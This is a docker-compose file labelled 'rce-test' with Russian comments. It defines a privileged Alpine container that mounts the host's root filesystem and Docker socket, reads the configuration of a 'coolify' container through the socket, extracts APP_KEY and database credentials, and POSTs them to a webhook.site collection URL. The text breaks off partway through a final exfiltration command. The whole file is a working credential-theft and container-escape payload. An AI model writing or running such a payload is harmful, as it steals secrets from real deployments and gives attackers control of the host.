version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/:/host-root'
      - '/var/run/docker.sock:/var/run/docker.sock'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl
        
        # 1. Сохраняем JSON контейнера coolify (с ведущим слешем!)
        curl -s --unix-socket /var/run/docker.sock http://localhost/containers/%2Fcoolify/json > /tmp/coolify.json
        
        # 2. Проверяем размер файла (должен быть несколько килобайт)
        ls -la /tmp/coolify.json | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=json_file_check
        
        # 3. Извлекаем APP_KEY и DB_PASSWORD
        grep -o '"APP_KEY=[^"]*"\|"DB_PASSWORD=[^"]*"\|"DB_USERNAME=[^"]*"' /tmp/coolify.json > /tmp/secrets.txt
        
        # 4. Отправляем секреты
        cat /tmp/secrets.txt | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=coolify_secrets
        
        # 5. Если grep не нашёл — отправляем первый кусок JSON для отладки
        if [ ! -s /tmp/secrets.txt ]; then
          head -c 2000 /tmp/coolify.json | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9
